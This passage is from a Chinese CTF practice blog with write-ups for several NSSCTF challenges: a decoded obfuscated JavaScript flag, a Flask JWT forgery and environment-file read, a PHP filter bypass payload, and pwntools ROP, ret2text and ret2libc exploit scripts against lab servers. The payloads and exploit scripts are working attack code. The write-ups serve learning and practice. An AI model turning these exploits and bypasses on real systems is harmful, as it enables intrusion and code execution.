<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a=~[];a=&#123;<span class="attr">___</span>:++a,<span class="attr">aaaa</span>:(![]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">__a</span>:++a,<span class="attr">a_a_</span>:(![]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">_a_</span>:++a,<span class="attr">a_aa</span>:(&#123;&#125;+<span class="string">&quot;&quot;</span>)[a],<span class="attr">aa_a</span>:(a[a]+<span class="string">&quot;&quot;</span>)[a],<span class="attr">_aa</span>:++a,<span class="attr">aaa_</span>:(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a],<span class="attr">a__</span>:++a,<span class="attr">a_a</span>:++a,<span class="attr">aa__</span>:(&#123;&#125;+<span class="string">&quot;&quot;</span>)[a],<span class="attr">aa_</span>:++a,<span class="attr">aaa</span>:++a,<span class="attr">a___</span>:++a,<span class="attr">a__a</span>:++a&#125;;a.<span class="property">a_</span>=(a.<span class="property">a_</span>=a+<span class="string">&quot;&quot;</span>)[a.<span class="property">a_a</span>]+(a.<span class="property">_a</span>=a.<span class="property">a_</span>[a.<span class="property">__a</span>])+(a.<span class="property">aa</span>=(a.<span class="property">a</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">__a</span>])+((!a)+<span class="string">&quot;&quot;</span>)[a.<span class="property">_aa</span>]+(a.<span class="property">__</span>=a.<span class="property">a_</span>[a.<span class="property">aa_</span>])+(a.<span class="property">a</span>=(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">__a</span>])+(a.<span class="property">_</span>=(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">_a_</span>])+a.<span class="property">a_</span>[a.<span class="property">a_a</span>]+a.<span class="property">__</span>+a.<span class="property">_a</span>+a.<span class="property">a</span>;a.<span class="property">aa</span>=a.<span class="property">a</span>+(!<span class="string">&quot;&quot;</span>+<span class="string">&quot;&quot;</span>)[a.<span class="property">_aa</span>]+a.<span class="property">__</span>+a.<span class="property">_</span>+a.<span class="property">a</span>+a.<span class="property">aa</span>;a.<span class="property">a</span>=(a.<span class="property">___</span>)[a.<span class="property">a_</span>][a.<span class="property">a_</span>];a.<span class="title function_">a</span>(a.<span class="title function_">a</span>(a.<span class="property">aa</span>+<span class="string">&quot;\&quot;&quot;</span>+a.<span class="property">a_a_</span>+(![]+<span class="string">&quot;&quot;</span>)[a.<span class="property">_a_</span>]+a.<span class="property">aaa_</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">aa_</span>+a.<span class="property">_a_</span>+a.<span class="property">__</span>+<span class="string">&quot;(\\\&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">a__</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">__a</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">_a_</span>+a.<span class="property">_aa</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">_aa</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">_a_</span>+a.<span class="property">a__</span>+<span class="string">&quot;\\&quot;</span>+a.<span class="property">__a</span>+a.<span class="property">___</span>+a.<span class="property">aa_</span>+<span class="string">&quot;&#123;&quot;</span>+a.<span class="property">aaaa</span>+a.<span class="property">a___</span>+a.<span class="property">___</span>+a.<span class="property">a__a</span>+a.<span class="property">aaa</span>+a.<span class="property">_a_</span>+a.<span class="property">a_a</span>+a.<span class="property">aaa</span>+a.<span class="property">aa_a</span>+a.<span class="property">aa_</span>+a.<span class="property">a__a</span>+a.<span class="property">a__a</span>+a.<span class="property">aa_a</span>+a.<span class="property">aaa</span>+a.<span class="property">aaaa</span>+a.<span class="property">aa_a</span>+a.<span class="property">a_aa</span>+a.<span class="property">a_a_</span>+a.<span class="property">aaa</span>+a.<span class="property">aaa_</span>+a.<span class="property">a__a</span>+a.<span class="property">aaa</span>+a.<span class="property">a_a_</span>+a.<span class="property">__a</span>+a.<span class="property">a_a</span>+a.<span class="property">aa__</span>+a.<span class="property">a__</span>+a.<span class="property">aaaa</span>+a.<span class="property">a__a</span>+a.<span class="property">a__</span>+a.<span class="property">a_aa</span>+a.<span class="property">a__</span>+<span class="string">&quot;&#125;\\\&quot;\\&quot;</span>+a.<span class="property">a__</span>+a.<span class="property">___</span>+<span class="string">&quot;);&quot;</span>+<span class="string">&quot;\&quot;&quot;</span>)())();</span><br></pre></td></tr></table></figure>
<p>运行一下即可：</p>
<p><code>DASCTF&#123;f8097257d699d7fdba7e97a15c4f94b4&#125;</code></p>
<hr>
<h2 id="Web">Web</h2>
<h3 id="NSSCTF-GHCTF-2024-新生赛-理想国">NSSCTF [GHCTF 2024 新生赛] 理想国</h3>
<p>题目给了一个 swagger 的 api 接口，召唤 Swagger UI 帮我审计：</p>
<p><img src="../resources/images/2025-01_assert/3.webp" alt=""></p>
<p>先利用这个 api 注册一个用户登陆进去看看。</p>
<p><img src="../resources/images/2025-01_assert/4.webp" alt=""></p>
<p>cookie 一眼 JWT ，先记在小本本上。</p>
<p>利用 search api 搜刮 flag ，但是常见位置都没有。</p>
<p>读环境变量呗：</p>
<h4 id="解-1-：">解 1 ：</h4>
<p><img src="../resources/images/2025-01_assert/5.webp" alt=""></p>
<p>两个信息：</p>
<ol>
<li class="lvl-3">
<p>JWT 的 Secret key 泄露了： <code>B3@uTy_L1es_IN_7he_EyEs_0f_Th3_BEh0ld3r</code></p>
</li>
<li class="lvl-3">
<p>题目挂在 <code>/app</code> 目录下。</p>
</li>
</ol>
<p>从响应包里得知题目是 flask ，访问 <code>/app/app.py</code> 得到源码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> wraps</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;TEMPLATES_RELOAD&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>)</span><br><span class="line">current_time = datetime.now().strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>)</span><br><span class="line"></span><br><span class="line">response0 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;failed&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line">response1 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;success&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: current_time&#125;</span><br><span class="line">response2 = &#123;<span class="string">&#x27;code&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Invalid request parameters&#x27;</span>, <span class="string">&#x27;result&#x27;</span>: <span class="literal">None</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == User.username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == User.password:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">func</span>):</span><br><span class="line"><span class="meta">    @wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decorated</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;Plato&quot;</span> <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == <span class="string">&quot;ideal_state&quot;</span>:</span><br><span class="line">                <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;You are not a sage. You cannot enter the ideal state.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">return</span> decorated</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;api-docs.json&#x27;</span>, mimetype=<span class="string">&#x27;application/json;charset=utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/enterIdealState&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@check</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>():</span><br><span class="line">    flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;Plato&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Your wisdom is not sufficient to be called a sage.&#x27;</span>, <span class="number">401</span></span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        User.setUser(username, password)</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: username, <span class="string">&#x27;password&#x27;</span>: password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line">        User.setToken(token)</span><br><span class="line">        <span class="keyword">return</span> jsonify(response1)</span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.json[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.json[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            token = User.token</span><br><span class="line">            payload = jwt.decode(token, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithms=[<span class="string">&#x27;HS256&#x27;</span>])</span><br><span class="line">            <span class="keyword">if</span> payload[<span class="string">&#x27;username&#x27;</span>] == username <span class="keyword">and</span> payload[<span class="string">&#x27;password&#x27;</span>] == password:</span><br><span class="line">                response = jsonify(response1)</span><br><span class="line">                response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">                <span class="keyword">return</span> response</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> jsonify(response0), <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">    <span class="keyword">return</span> jsonify(response2), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Logout successful!&#x27;</span>&#125;)</span><br><span class="line">    response.delete_cookie(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api-base/v0/search&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@auth</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;file&#x27;</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(request.args.get(<span class="string">&#x27;file&#x27;</span>), <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template_string(data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;File not found&#x27;</span>, <span class="number">404</span></span><br><span class="line">        <span class="keyword">except</span> jwt.ExpiredSignatureError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> jwt.InvalidTokenError:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Invalid token&#x27;</span>, <span class="number">401</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;something error?&#x27;</span>, <span class="number">500</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(response2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MemUser</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setUser</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setToken</span>(<span class="params">self, token</span>):</span><br><span class="line">        <span class="variable language_">self</span>.token = token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;password&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.token = jwt.encode(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="variable language_">self</span>.username, <span class="string">&#x27;password&#x27;</span>: <span class="variable language_">self</span>.password&#125;, app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>], algorithm=<span class="string">&#x27;HS256&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    User = MemUser()</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
<p>审计，发现用特定用户访问 <code>/enterIdealState</code> 路由可以得到 flag 。</p>
<p>简单的 cookie 伪造，利用之前得到的 Secret key 即可。</p>
<p><img src="../resources/images/2025-01_assert/6.webp" alt=""></p>
<h4 id="解-2-：">解 2 ：</h4>
<p>其实读 <code>/proc/1/environ</code> 就可以了。</p>
<p><img src="../resources/images/2025-01_assert/7.webp" alt=""></p>
<p><code>NSSCTF&#123;0bff05c6-c571-4113-a7fa-8bc6bb473510&#125;</code></p>
<h3 id="NSSCTF-NCTF-2018-Easy-Audit">NSSCTF [NCTF 2018]Easy_Audit</h3>
<p>给了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/yulige|flag|nctf/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))  <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>], <span class="number">32</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;yulige&#x27;</span>])))&#123;         <span class="comment">//日爆md5!!!!!!</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/nctfisfun$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;nctf&#x27;</span>] !== <span class="string">&#x27;nctfisfun&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$getflag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$getflag</span>) &amp;&amp; <span class="variable">$getflag</span> === <span class="string">&#x27;ccc_liubi&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;waf..&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>一眼考 php 特性。</p>
<p>第一层 <code>if($_REQUEST)</code> 的判断可以利用 php <code>GET</code> 和 <code>POST</code> 同时传参，优先解析 <code>POST</code> 的参数的特性 bypass .</p>
<p>第二层 <code>if($_SERVER)</code> 的判断可以利用 <code>$_SERVER['QUERY_STRING']</code> 返回的是未经过 URL 解码的内容 bypass .</p>
<p>第三层 <code>if(!(substr($_GET['yulige'], 32) === md5($_GET['yulige'])))</code> 数组绕过即可 .</p>
<p>第四层 利用 <code>data://</code> 伪协议传文本过去。</p>
<p>payload：<br>
GET : <code>yulig%65[]=1&amp;nct%66=nct%66isfun%0a&amp;fla%67=data://text/plain,ccc_liubi</code><br>
POST : <code>yulige=0&amp;nctf=0&amp;flag=0</code></p>
<h2 id="Pwn">Pwn</h2>
<h3 id="NSSCTF-GFCTF-2021-where-is-shell">NSSCTF [GFCTF 2021] where_is_shell</h3>
<p>麻了，$0 还能这样藏的😅</p>
<p>plt 里给了 <code>system</code> , <code>main</code> 里存在栈溢出 , <code>tips</code> 在 opcode 里藏了个 <code>$0</code> 也即 <code>/bin/sh</code></p>
<p>ROPgadget 可以找出来控制 <code>rdi</code> 的 gadget , 再找个 <code>ret</code> 对齐一下 .</p>
<p>凑一下就出来了:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./shell&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28277</span>)</span><br><span class="line"></span><br><span class="line">sys_plt = <span class="number">0x400430</span></span><br><span class="line">bin_sh = <span class="number">0x400541</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005e3</span></span><br><span class="line">ret = <span class="number">0x400416</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">24</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * offset, ret, pop_rdi_ret, bin_sh, sys_plt])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;it?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><code>NSSCTF&#123;47c01ec2-2d70-492a-bd96-963f26effcc0&#125;</code></p>
<h3 id="NSSCTF-NSSCTF-2022-Spring-Recruit-R3m4ke">NSSCTF [NSSCTF 2022 Spring Recruit] R3m4ke?</h3>
<p>最简单的 ret2text .</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./r3m4ke1t&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28423</span>)</span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x400730</span></span><br><span class="line">ret = <span class="number">0x40057e</span></span><br><span class="line"></span><br><span class="line">offset = <span class="number">40</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;A&#x27;</span> * offset, backdoor_addr])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;started&gt;&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="NSSCTF-LitCTF-2023-狠狠的溢出涅">NSSCTF [LitCTF 2023] 狠狠的溢出涅~</h3>
<p>过于标准的 ret2libc .</p>
<p>要点就是老生常谈的 <code>strlen</code> 可以被 <code>\x00</code> 绕过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;Debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>, <span class="number">28027</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">start = elf.symbols[<span class="string">&#x27;_start&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x400556</span></span><br><span class="line">rdi = <span class="number">0x4007d3</span></span><br><span class="line"></span><br><span class="line">offset1 = <span class="number">0x67</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = flat([<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * offset1, ret, rdi, puts_got, puts_plt, start])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Leave your message:\n&quot;</span>, leak)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr =  u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr)</span><br><span class="line">libc_base_addr = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base_addr + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base_addr + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span> * offset1, p64(ret), p64(rdi), p64(binsh_addr), p64(system_addr)])</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Leave your message:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><code>NSSCTF&#123;u_r_master_of_stackoverflow_and_intoverflow&#125;</code></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>Practice</tag>
      </tags>
  </entry>
  <entry>
    <title>贰零贰伍年贰月·散装刷题月记</title>
    <url>/2025/02/03/2025-02%20WriteUp/</url>
    <content><![CDATA[<h1>贰零贰伍年贰月刷题月记</h1>
<hr>
<h2 id="说在前面">说在前面</h2>
<p>想起来跟队打的有些比赛的题解还没写上来，就在这里补上吧.</p>
<hr>
<h2 id="Misc">Misc</h2>
<h3 id="SWPUCTF-2021-新生赛-zipbomb">[SWPUCTF 2021 新生赛] zipbomb</h3>
<p>zip 炸弹，</p>
<p>7zip 打开，提示：</p>
<p><img src="/resources/images/2025-02_assert/1.webp#img_half" alt=""></p>
<p>大概率是文件结尾藏了东西。</p>
<p>用 010 进行分析，可发现结尾处藏了一个 zip 文件，提取解压即可。</p>
<p><code>NSSCTF&#123;Z1p_B00m_d1sp0sal&#125;</code></p>
